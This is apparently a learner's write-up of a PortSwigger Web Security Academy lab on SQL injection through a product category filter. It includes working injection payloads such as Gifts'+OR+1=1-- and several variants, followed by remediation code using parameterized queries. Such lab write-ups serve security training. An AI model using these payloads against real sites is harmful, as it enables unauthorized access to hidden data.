# SQL Injection Vulnerability in WHERE Clause

**Platform:** PortSwigger Web Security Academy  
**Lab URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data  
**Difficulty:** Apprentice  
**Date Completed:** March 12, 2026  
**Status:** ✅ Solved  

---

## 📋 Lab Description

**Objective:**  
This lab contains a SQL injection vulnerability in the product category filter. The application carries out an SQL query when the user selects a category. The goal is to display all products in any category, both released and unreleased.

**Learning Goals:**
- Understand SQL injection in WHERE clauses
- Learn to manipulate SQL queries through user input
- Practice URL-based SQL injection

---

## 🔍 Reconnaissance

**Initial Observation:**
- The application is a product catalog website
- Categories can be filtered via URL parameter: `?category=Gifts`
- Different categories show different products
- Some products appear to be hidden (unreleased)

**Vulnerable Parameter:**  
`category` parameter in the URL

**Suspected Vulnerable Query:**
```sql
SELECT * FROM products WHERE category = 'USER_INPUT' AND released = 1
```

---

## 💉 Exploitation

### Step 1: Normal Behavior Test

**Request:**
```
GET /filter?category=Gifts HTTP/1.1
```

**Result:**  
Shows only products in "Gifts" category that are released (released = 1)

### Step 2: SQL Injection Test

**Payload:**
```
category=Gifts'+OR+1=1--
```

**Full URL:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+OR+1=1--
```

**Modified Query (after injection):**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

**Result:**  
✅ All products displayed (all categories, including unreleased products)  
✅ Lab solved successfully!

---

## 🧠 Technical Explanation

### How the Injection Works:

1. **Original query structure:**
   ```sql
   SELECT * FROM products WHERE category = '[USER_INPUT]' AND released = 1
   ```

2. **User input:** `Gifts' OR 1=1--`

3. **Resulting query:**
   ```sql
   SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
   ```

4. **Query breakdown:**
   - `category = 'Gifts'` → First condition (checks category)
   - `OR 1=1` → Second condition (ALWAYS TRUE)
   - `--` → SQL comment (ignores rest: `' AND released = 1`)

5. **Result:**  
   Since `OR 1=1` is always true, the WHERE clause evaluates to true for ALL rows, returning all products regardless of category or release status.

---

## 🎯 Alternative Payloads Tested

### Payload 1: Empty category with OR condition
```
category='+OR+1=1--
```
**Result:** ✅ Works - shows all products

### Payload 2: Different true condition
```
category=Gifts'+OR+'a'='a'--
```
**Result:** ✅ Works - shows all products

### Payload 3: Using comment without space
```
category=Gifts'+OR+1=1--+
```
**Result:** ✅ Works - trailing space after comment

---

## 🚨 Impact Assessment

**Severity:** High

**Business Impact:**
- Unauthorized access to unreleased product information
- Potential competitive intelligence leak
- Violation of product release schedule
- Data confidentiality breach

**Technical Impact:**
- Application logic bypass
- Database access control circumvention
- Foundation for more severe attacks (data extraction, modification)

**Attack Complexity:** Low (simple URL manipulation)  
**Privileges Required:** None (unauthenticated)  
**User Interaction:** None  

---

## 🛡️ Remediation

### Recommended Fix: Parameterized Queries

**Vulnerable Code (example):**
```python
# BAD - String concatenation
query = "SELECT * FROM products WHERE category = '" + user_input + "' AND released = 1"
```

**Secure Code:**
```python
# GOOD - Parameterized query
cursor.execute(
    "SELECT * FROM products WHERE category = ? AND released = 1",
    (user_input,)
)
```

**Other Languages:**

**PHP (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = :category AND released = 1");
$stmt->execute(['category' => $user_input]);
```

**Java (PreparedStatement):**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ? AND released = 1"
);
stmt.setString(1, userInput);
```

**C# (.NET):**
```csharp
var command = new SqlCommand(
    "SELECT * FROM products WHERE category = @category AND released = 1", 
    connection
);
command.Parameters.AddWithValue("@category", userInput);
```

### Additional Security Measures:

1. **Input Validation:**
   - Whitelist allowed categories
   - Reject special characters if not needed

2. **Least Privilege:**
   - Database user should have minimal permissions
   - Read-only access where possible

3. **WAF (Web Application Firewall):**
   - Add layer of defense against common SQL injection patterns
   - Not a replacement for secure coding!

4. **Regular Security Testing:**
   - Automated SAST/DAST scanning
   - Manual penetration testing
   - Code reviews focused on security

---

## 📚 Lessons Learned

1. **SQL Injection Basics:**
   - User input should NEVER be directly concatenated into SQL queries
   - Even simple filters can be vulnerable
   - `OR 1=1` is a classic SQL injection test

2. **URL Parameters Are User Input:**
   - URL parameters are as dangerous as form inputs
   - They're easily manipulated by attackers
   - Must be treated as untrusted data

3. **SQL Comments Matter:**
   - `--` in SQL comments out everything after it
   - Useful for attackers to remove security checks
   - Different databases use different comment syntax

4. **Defense in Depth:**
   - Parameterized queries are the primary defense
   - But also use input validation, least privilege, monitoring

---

## 🔗 References

- **OWASP Top 10 2021:** A03:2021 – Injection
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet

---

## 📸 Screenshots

*(Add screenshots here showing:)*
1. Lab description page
2. Normal category filter behavior
3. Injected payload in URL
4. All products displayed (successful exploitation)
5. "Lab solved" confirmation

---

## ✅ Completion Checklist

- [x] Understood the lab objective
- [x] Identified vulnerable parameter
- [x] Crafted working SQL injection payload
- [x] Successfully exploited vulnerability
- [x] Documented technical details
- [x] Researched proper remediation
- [x] Completed writeup

---

## 🏷️ Tags

`sql-injection` `where-clause` `portswigger` `web-security` `owasp-top-10` `apprentice` `injection`

---

*This writeup is for educational purposes as part of authorized security training on PortSwigger Web Security Academy.*
